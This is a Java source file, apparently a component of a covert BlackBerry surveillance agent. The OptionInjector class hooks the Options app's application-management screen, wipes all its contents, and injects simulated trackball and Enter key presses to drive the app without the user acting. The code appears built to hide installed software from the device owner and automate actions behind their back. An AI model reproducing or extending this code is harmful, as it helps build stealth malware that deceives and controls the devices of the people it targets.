package blackberry.injection.injectors;

import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.KeyInjector;
import blackberry.utils.Utils;

public class OptionInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("OptionInjector", DebugLevel.VERBOSE);

    //#endif

    public String getAppName() {
        return "Options";
    }

    public String getCodName() {
        return "net_rim_bb_options_app";
    }

    public String[] getWantedScreen() {
        return new String[] { "AppMgmtScreen" };
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + getInjectedApp());
        //#endif
        synchronized (getInjectedApp().getAppEventLock()) {
            screen.deleteAll();
        }
    }

    public boolean execute(String codName) {
        //#ifdef DEBUG
        debug.trace("execute Schedule: " + codName);
        //Backlight.enable(true);
        //#endif
        if (executeSchedule(codName)) {
            KeyInjector.trackBallDown(1);
            Utils.sleep(200);
            KeyInjector.pressKey(Keypad.KEY_ENTER);
            Utils.sleep(200);
            return true;
        }
        return false;
    }

}
